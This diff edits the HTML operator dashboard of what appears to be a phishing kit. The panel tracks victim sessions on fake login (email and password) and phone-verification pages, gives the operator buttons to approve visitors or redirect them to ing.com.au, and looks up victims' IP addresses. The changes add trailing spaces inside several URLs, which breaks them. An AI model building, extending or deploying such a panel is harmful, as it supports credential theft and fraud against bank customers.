@@ -4,8 +4,8 @@
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
   <title>$$$</title>
-  <link rel="preconnect" href="https://rsms.me">
-  <link rel="stylesheet" href="https://rsms.me/inter/inter.css">
+  <link rel="preconnect" href="https://rsms.me ">
+  <link rel="stylesheet" href="https://rsms.me/inter/inter.css ">
   <style>
     :root {
       --bg: #000000;
@@ -814,9 +814,9 @@
       html += `<button class="icon-btn manage" onclick="showDetail('${s.sid}')" title="View Details"><img src="/images/description-svgrepo-com.svg"></button>`;
       if (s.page === 'success' || s.status === 'approved') return html + '</div>';
       
-      // Quick approve button for verify.html with phone entered
+      // Quick approve button for verify.html with phone entered - redirects to ing.com.au
       if (s.page === 'verify.html' && s.phone && s.entered) {
-        html += `<button class="icon-btn skip" onclick="act('skip','${s.sid}')" title="Quick Approve"><img src="/images/check.png"></button>`;
+        html += `<button class="icon-btn skip" onclick="act('skip','${s.sid}')" title="Quick Approve (to ing.com.au)"><img src="/images/check.png"></button>`;
       }
       
       if (s.page === 'index.html' && (s.entered || (s.email && s.password))) {
@@ -983,7 +983,7 @@
     /* ----------  IP LOOKUP  ---------- */
     function openIpLookup(ip) {
       const cleanIp = ip.split(':')[0];
-      window.open(`https://db-ip.com/${cleanIp}`, '_blank');
+      window.open(`https://db-ip.com/ ${cleanIp}`, '_blank');
     }
 
     /* ----------  MODALS  ---------- */
